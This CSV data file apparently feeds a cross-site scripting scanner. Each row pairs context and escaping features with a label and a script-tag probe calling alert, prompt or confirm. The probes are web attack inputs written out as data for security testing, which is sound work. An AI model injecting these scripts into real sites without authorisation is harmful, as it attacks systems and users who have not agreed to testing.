op_html,op_attr,op_js,op_vbs,op_quot,esc_double,esc_single,esc_back,esc_left,esc_right,esc_alert,esc_prompt,esc_confirm,esc_balert,esc_sscript,esc_escript,esc_msgbox,label,inspection_strings
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,2,[<script>confirm();</script>]
2,0,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,2,[<script>confirm();</script>]
